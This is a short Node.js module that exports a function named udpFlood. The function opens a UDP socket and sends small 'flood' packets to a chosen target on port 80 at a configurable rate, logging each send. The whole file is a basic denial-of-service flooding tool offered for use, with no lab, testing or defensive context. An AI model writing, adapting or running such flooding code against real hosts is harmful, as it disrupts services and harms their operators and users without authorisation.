const dgram = require('dgram');

function udpFlood(target, rateLimit, logOutput) {
    const message = new Buffer('flood');
    const client = dgram.createSocket('udp4');

    setInterval(() => {
        client.send(message, 0, message.length, 80, target, (err) => {
            if (err) {
                logOutput('Error: ' + err.message);
            } else {
                logOutput('Sent UDP packet');
            }
        });
    }, 1000 / rateLimit);
}

module.exports = udpFlood;
